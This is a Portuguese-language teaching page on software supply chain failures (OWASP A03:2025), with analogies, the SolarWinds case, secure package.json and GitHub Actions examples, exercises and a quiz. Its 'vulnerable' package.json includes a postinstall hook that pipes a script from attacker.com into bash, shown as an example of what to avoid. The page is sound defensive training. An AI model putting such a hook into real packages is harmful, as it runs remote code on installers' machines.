---
title: "A03:2025 — Software Supply Chain Failures"
description: "Falhas na cadeia de suprimentos de software: quando o problema vem de fora"
tags: [supply-chain, dependencias, ci-cd, alto, a03]
---

# A03:2025 — Software Supply Chain Failures

<span style="background-color: #e67e22; color: white; padding: 4px 12px; border-radius: 4px; font-weight: bold;">RISCO ALTO</span>

> **Analogia**: Você compra ingredientes de um fornecedor de confiança para fazer um bolo. O fornecedor, sem saber, recebeu ovos contaminados de outro fornecedor. Seu bolo estava perfeito, mas os ingredientes já vieram com problema. Você não contaminou o bolo — a cadeia de fornecimento foi comprometida.

---

## O que é?

=== "🟢 Para leigos"
    Hoje em dia, qualquer aplicação usa dezenas (ou centenas!) de componentes prontos feitos
    por outras pessoas — bibliotecas, frameworks, plugins. Isso é ótimo para produtividade,
    mas cria um risco: **e se um desses componentes tiver um problema de segurança?**

    É isso que chamamos de Supply Chain Attack — o ataque não vem direto no seu código, mas
    em algo que você usa. Como se um ingrediente que você comprou já viesse envenenado.

    O caso mais famoso foi o **SolarWinds** (2020): criminosos invadiram a empresa e
    inseriram código malicioso no software que ela vendia. Quando os clientes atualizaram
    o software, instalaram o malware sem saber.

=== "🟡 Desenvolvedor júnior"
    Supply chain failures acontecem quando:

    - **Dependências vulneráveis**: você usa uma biblioteca com CVE conhecido
    - **Typosquatting**: pacote malicioso com nome parecido (`coloers` vs `colors`)
    - **Dependency confusion**: pacote privado substituído por um público com mesmo nome
    - **Comprometimento do mantenedor**: conta npm/PyPI de um mantenedor é hackeada
    - **Malicious CI/CD**: código malicioso injetado no pipeline de build
    - **Imagens Docker comprometidas**: imagem base do Docker Hub com backdoor

    Em 2021, o ataque ao `ua-parser-js` (npm) afetou milhões de projetos quando a conta
    do mantenedor foi comprometida e o pacote foi atualizado com malware.

=== "🔴 Desenvolvedor sênior"
    Supply chain é o vetor de ataque mais sofisticado e difícil de detectar em 2025.
    O atacante não precisa invadir sua empresa — basta comprometer algo que você usa.

    **Superfície de ataque moderna:**

    - **npm/PyPI/Maven/NuGet**: repositórios públicos com controle limitado de qualidade
    - **GitHub Actions**: actions de terceiros com acesso a secrets do repositório
    - **Terraform Registry**: módulos com permissões IAM excessivas
    - **Container registries**: imagens base com vulnerabilidades em camadas inferiores
    - **SBOMs ausentes**: sem Software Bill of Materials, você não sabe o que está rodando
    - **Transitive dependencies**: a dependência de uma dependência de uma dependência

    **Frameworks de mitigação**: SLSA (Supply chain Levels for Software Artifacts),
    Sigstore para assinatura de artefatos, Cosign para verificação de imagens.

---

## Código vulnerável vs. seguro

=== "❌ Dependências sem controle"
    ```json
    // package.json vulnerável
    {
      "dependencies": {
        "express": "*",          // Qualquer versão — pode instalar versão maliciosa
        "lodash": "^4.0.0",     // Lodash tem CVEs conhecidos em versões antigas
        "event-stream": "3.3.6" // Esta versão específica foi comprometida em 2018!
      },
      "scripts": {
        "postinstall": "curl http://attacker.com/init.sh | bash"
        // NUNCA: executar scripts de instalação sem revisar
      }
    }
    ```

=== "✅ Dependências controladas"
    ```json
    // package.json seguro
    {
      "dependencies": {
        "express": "4.18.2",    // Versão específica, não ranges abertos
        "lodash": "4.17.21"     // Versão mais recente sem CVEs críticos
      },
      "engines": {
        "node": ">=18.0.0"      // Define versão mínima do Node
      }
    }
    ```

    ```bash
    # Verificar vulnerabilidades nas dependências
    npm audit

    # Corrigir automaticamente (quando possível)
    npm audit fix

    # Ver detalhes de uma vulnerabilidade específica
    npm audit --json | jq '.vulnerabilities'

    # Gerar lock file (nunca commitar sem ele!)
    npm ci  # Usa package-lock.json — instalação determinística
    ```

=== "✅ GitHub Actions seguro"
    ```yaml
    # .github/workflows/deploy.yml
    name: Deploy

    on:
      push:
        branches: [main]

    jobs:
      deploy:
        runs-on: ubuntu-latest
        steps:
          # SEGURO: usar hash do commit, não tag (tags podem ser movidas!)
          - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

          # INSEGURO (não fazer):
          # - uses: some-third-party/action@main  # branch mutável, pode mudar a qualquer hora
          # - uses: some-third-party/action@v1    # tag pode ser movida ou deletada

          # Verificar integridade de dependências
          - name: Instalar dependências
            run: npm ci  # Usa lock file — determinístico

          # Scan de segurança no CI
          - name: Verificar vulnerabilidades
            run: npm audit --audit-level=high

          - name: Build
            run: npm run build

          # Assinar artefato com Sigstore/Cosign
          - name: Assinar imagem Docker
            run: |
              cosign sign --yes ghcr.io/${{ github.repository }}:${{ github.sha }}
    ```

---

## Cenário de ataque real

!!! danger "Cenário de ataque real — SolarWinds (2020)"
    **Situação**: SolarWinds é uma empresa que faz software de monitoramento de rede usado
    por 33.000 empresas, incluindo agências do governo dos EUA.

    **Ataque**:

    1. Grupo APT29 (Cozy Bear, ligado ao governo russo) invade o ambiente de build da SolarWinds
    2. Inserem código malicioso no código-fonte do Orion (software de monitoramento)
    3. O código malicioso passa por todos os testes automatizados — foi bem disfarçado
    4. A SolarWinds assina digitalmente o software comprometido e distribui como atualização normal
    5. 18.000 clientes instalam a atualização "confiável"
    6. O malware (SUNBURST) cria backdoor silencioso por meses

    **Consequência**: Compromisso de agências do governo dos EUA (Treasury, Commerce, Homeland Security),
    Fortune 500 companies, e empresas de segurança como FireEye. Considerado um dos maiores ataques
    cibernéticos da história.

---

## Como prevenir

- [x] **Lock files**: usar `package-lock.json`, `poetry.lock`, `go.sum` — nunca ignorar
- [x] **Versões específicas**: pin de versões exatas, não ranges abertos (`^`, `*`, `latest`)
- [x] **Scan de dependências**: `npm audit`, `pip-audit`, `trivy`, `snyk` no CI/CD
- [ ] **SBOM (Software Bill of Materials)**: gerar lista de todos os componentes
- [ ] **Assinatura de artefatos**: Sigstore/Cosign para verificar integridade de imagens
- [ ] **GitHub Actions pinned**: usar hash de commit em actions de terceiros
- [ ] **Dependency review**: aprovação manual para novas dependências adicionadas
- [ ] **Monitoramento de CVEs**: alertas automáticos quando CVE afeta suas dependências (Dependabot)

---

## Exercícios práticos

!!! question "Exercício 1 — Identifique o risco"
    Analise este `requirements.txt` e identifique os riscos:

    ```
    Flask==1.1.2
    requests
    cryptography>=2.0
    Pillow==8.0.0
    django
    ```

    ??? success "Ver resposta"
        **Problema 1**: `requests` sem versão — pode instalar qualquer versão, incluindo futura
        comprometida.

        **Problema 2**: `cryptography>=2.0` — range muito aberto, versões antigas têm CVEs graves.

        **Problema 3**: `Pillow==8.0.0` — versão antiga com múltiplos CVEs críticos (incluindo
        CVE-2021-25287: buffer overflow, CVE-2021-27921: DoS).

        **Problema 4**: `django` sem versão — totalmente aberto.

        **Correção**: Pin todas as versões e verifique com `pip-audit`:
        ```
        Flask==3.0.3
        requests==2.31.0
        cryptography==42.0.5
        Pillow==10.3.0
        django==5.0.4
        ```

!!! question "Exercício 2 — Corrija o workflow"
    Este GitHub Actions tem problemas de segurança na supply chain. Corrija:

    ```yaml
    jobs:
      build:
        steps:
          - uses: actions/checkout@v3
          - uses: snyk/actions/node@master
          - run: npm install
          - run: npm run build
    ```

    ??? success "Ver solução modelo"
        ```yaml
        jobs:
          build:
            steps:
              # Pin por hash de commit (imutável)
              - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

              # Pin por hash — nunca @master (mutável!)
              - uses: snyk/actions/node@d4b9c0c0c8c4e9e7e8f6a5b4c3d2e1f0a9b8c7d6  # v0.4.0

              # npm ci usa lock file — determinístico
              - run: npm ci

              - run: npm run build
        ```

!!! tip "Desafio extra"
    Configure o **Dependabot** no seu próximo projeto:

    1. Crie `.github/dependabot.yml` com verificação semanal de dependências npm e Python
    2. Habilite o **Dependency Review** no GitHub para bloquear PRs com dependências vulneráveis
    3. Use `trivy` para escanear imagens Docker: `trivy image minha-app:latest`

---

## Quiz rápido

!!! example "Pergunta 1"
    O que é **typosquatting** em repositórios de pacotes?

    ??? note "Ver resposta"
        Typosquatting é quando um atacante publica um pacote com nome muito similar a um legítimo,
        esperando que desenvolvedores digitem errado. Exemplos reais no npm:
        `cros-env` (vs `cross-env`), `coloers` (vs `colors`), `babelcli` (vs `babel-cli`).
        Esses pacotes maliciosos geralmente roubam tokens de ambiente, secrets, ou instalam backdoors.

!!! example "Pergunta 2"
    Por que usar `npm install` é menos seguro que `npm ci` em pipelines de CI/CD?

    ??? note "Ver resposta"
        `npm install` pode atualizar o `package-lock.json` e instalar versões diferentes das
        especificadas se houver atualizações de patch disponíveis. `npm ci` sempre usa exatamente
        as versões do lock file, garantindo builds determinísticos e reproduzíveis. Se o lock file
        não existir, `npm ci` falha — o que é o comportamento correto para CI.

!!! example "Pergunta 3"
    O que é SLSA e por que ele importa para supply chain security?

    ??? note "Ver resposta"
        SLSA (Supply-chain Levels for Software Artifacts, pronuncia-se "salsa") é um framework
        do Google (agora mantido pela OpenSSF) que define níveis de maturidade para segurança
        da cadeia de suprimentos. Vai do SLSA 1 (builds documentados) ao SLSA 4 (builds herméticos,
        reproduzíveis e auditáveis). Seguir o SLSA ajuda a garantir que o software que chega aos
        usuários é exatamente o que foi desenvolvido.

---

## Referências

!!! info "Saiba mais"
    - [OWASP A03:2025 — Software Supply Chain Failures](https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/)
    - [SLSA Framework](https://slsa.dev/)
    - [Sigstore / Cosign](https://www.sigstore.dev/)
    - [OpenSSF Scorecard](https://securityscorecards.dev/) — avalia segurança de projetos open source
    - [Dependabot Documentation](https://docs.github.com/en/code-security/dependabot)
    - [CVE do evento-stream (npm)](https://snyk.io/blog/malicious-code-found-in-npm-package-event-stream/)
